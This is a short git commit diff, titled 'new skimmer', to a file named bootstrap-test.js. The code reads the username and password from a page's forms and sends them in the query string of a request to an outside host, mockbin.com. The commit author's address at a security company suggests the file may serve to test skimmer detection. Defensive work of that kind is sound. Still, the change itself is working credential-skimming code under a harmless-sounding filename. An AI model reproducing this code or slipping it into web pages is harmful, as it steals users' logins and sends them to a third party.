e414f251ce0b5fc0a2df216cf5b2be4739b26421
johnsalay <john.salangsang@imperva.com>
2022-03-01 09:34:56 -0800

    new skimmer

--- bootstrap-test.js
+++ bootstrap-test.js
@@ -2,10 +2,10 @@ function start() {
     console.log('start')
     const form = document.forms
 
-    const sendToMe = async function (event) {
+    const sendToMe = function (event) {
         const username = event.currentTarget[0].value
         const password = event.currentTarget[1].value
-        const response = await fetch(`http://mockbin.com/request?username=${username}&password=${password}`, {
+        fetch(`http://mockbin.com/request?username=${username}&password=${password}`, {
             "headers": {
                 "cookie": "foo=bar; bar=baz",
                 "x-pretty-print": "2"
